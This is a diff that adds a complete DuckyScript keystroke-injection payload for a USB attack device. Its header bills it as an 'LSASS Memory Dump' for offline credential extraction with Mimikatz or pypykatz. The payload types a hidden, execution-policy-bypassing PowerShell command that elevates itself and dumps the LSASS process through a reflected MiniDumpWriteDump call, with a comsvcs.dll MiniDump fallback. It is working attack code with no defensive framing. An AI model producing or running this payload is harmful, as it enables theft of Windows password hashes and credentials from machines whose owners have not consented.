@@ -1,0 +1,14 @@
+REM ============================================
+REM  FU PERSON | LSASS Memory Dump
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: LOW
+REM  Dumps LSASS for offline cred extraction
+REM  Use Mimikatz/pypykatz to extract hashes
+REM  Requires: Admin
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ep bypass -c \"$d=[Environment]::GetFolderPath(\\\"Desktop\\\")+\\\"\lsass_dump\\\";md $d -f|Out-Null;$p=Get-Process lsass;$f=\\\"$d\lsass_\\\"+$env:COMPUTERNAME+\\\".dmp\\\";$MiniDumpWriteDump=[PSObject].Assembly.GetType(\\\"System.Management.Automation.WindowsErrorReporting\\\").GetNestedType(\\\"NativeMethods\\\",\\\"NonPublic\\\").GetMethod(\\\"MiniDumpWriteDump\\\",[Reflection.BindingFlags]\\\"NonPublic,Static\\\");$fs=New-Object IO.FileStream($f,[IO.FileMode]::Create);$MiniDumpWriteDump.Invoke($null,@($p.Handle,$p.Id,$fs.SafeFileHandle,[UInt32]2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))|Out-Null;$fs.Close();if(Test-Path $f){\\\"LSASS dump saved: $f\\\"|Out-File \\\"$d\success.txt\\\"}else{rundll32 comsvcs.dll MiniDump $($p.Id) \\\"$d\lsass2.dmp\\\" full 2>$null;\\\"Fallback method used\\\"|Out-File \\\"$d\success.txt\\\"}\"'"
+ENTER
+DELAY 500
